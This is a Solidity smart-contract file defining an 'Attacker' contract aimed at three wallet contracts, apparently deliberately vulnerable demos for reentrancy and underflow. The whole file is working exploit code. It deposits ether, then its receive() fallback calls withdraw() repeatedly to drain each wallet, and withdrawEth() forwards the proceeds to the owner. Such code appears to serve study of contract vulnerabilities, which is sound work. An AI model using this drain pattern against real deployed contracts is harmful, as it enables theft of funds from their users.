//SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./WalletReentrancy.sol";
import "./Wallet.sol";
import "./WalletUnderflow.sol";

contract Attacker {
    uint constant SUM = 1 ether;
    Wallet wallet;
    WalletReentrancy walletRe;
    WalletUnderflow walletUn;
    address owner;

    constructor(
        Wallet _wallet,
        WalletReentrancy _walletRe,
        WalletUnderflow _walletUn
    ) {
        owner = msg.sender;
        wallet = _wallet;
        walletRe = _walletRe;
        walletUn = _walletUn;
    }

    modifier onlyOnwer() {
        require(msg.sender == owner, "not an owner!");
        _;
    }

    function depositWallet() public payable onlyOnwer {
        wallet.deposit{value: SUM}(address(this));
    }

    function attackWallet() external onlyOnwer {
        wallet.withdraw(SUM);
    }

    function depositWalletRe() public payable onlyOnwer {
        walletRe.deposit{value: SUM}(address(this));
    }

    function attackWalletRe() external onlyOnwer {
        walletRe.withdraw();
    }

    function depositWalletUn() public payable onlyOnwer {
        walletUn.deposit{value: SUM}(address(this));
    }

    function attackWalletUn() external onlyOnwer {
        walletUn.withdraw(SUM);
    }

    function withdrawEth() external payable onlyOnwer {
        require(address(this).balance > 0, "there is no eth on the contract");
        (bool success, ) = owner.call{value: address(this).balance}("");
        require(success, "failed");
    }

    receive() external payable {
        if (
            msg.sender == address(walletRe) && address(walletRe).balance >= SUM
        ) {
            walletRe.withdraw();
        } else if (
            msg.sender == address(walletUn) && address(walletUn).balance >= SUM
        ) {
            walletUn.withdraw(SUM);
        } else {
            if (address(wallet).balance >= SUM) {
                wallet.withdraw(SUM);
            }
        }
    }
}
